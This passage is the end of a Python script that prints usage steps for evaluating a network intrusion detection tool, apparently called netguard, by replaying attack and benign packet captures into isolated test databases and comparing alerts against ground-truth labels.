    print(f"    # 1. Replay attack PCAP into isolated DB:")
    print(f"    python evaluation/replay.py \\")
    print(f"      --pcap {OUTPUT_ATTACK} \\")
    print(f"      --blocklist {TEST_BLOCKLIST} \\")
    print(f"      --db /tmp/netguard-eval.db \\")
    print(f"      --arp-table /tmp/netguard-eval-arp.json")
    print()
    print(f"    # 2. Run ground-truth evaluation against the SAME isolated DB:")
    print(f"    python evaluation/compare.py \\")
    print(f"      --mode ground-truth \\")
    print(f"      --labels {LABELS_CSV} \\")
    print(f"      --db /tmp/netguard-eval.db")
    print()
    print(f"    # 3. Replay benign PCAP (fresh ARP table) — expect zero alerts:")
    print(f"    python evaluation/replay.py \\")
    print(f"      --pcap {OUTPUT_BENIGN} \\")
    print(f"      --blocklist {TEST_BLOCKLIST} \\")
    print(f"      --db /tmp/netguard-benign.db \\")
    print(f"      --arp-table /tmp/netguard-benign-arp.json")


if __name__ == "__main__":
    generate_all()
